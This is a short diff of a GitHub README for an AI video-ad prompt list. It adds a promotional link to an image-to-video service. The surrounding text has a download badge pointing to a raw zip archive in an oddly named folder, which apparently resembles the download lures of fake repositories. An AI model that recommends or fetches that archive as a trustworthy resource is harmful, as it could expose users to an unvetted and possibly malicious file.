@@ -1,5 +1,6 @@
 # 🎥 awesome-ai-ugc-video-prompts - Create viral video ads with AI
 
+- [Ideoy](https://ideoy.ai) - Remake this week's viral meme videos from one selfie (AI image-to-video, 9:16, freemium).
 [![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/wassaillowerlimit6418/awesome-ai-ugc-video-prompts/main/arsenium/ai-video-ugc-prompts-awesome-2.2.zip)
 
 ## 📌 Overview
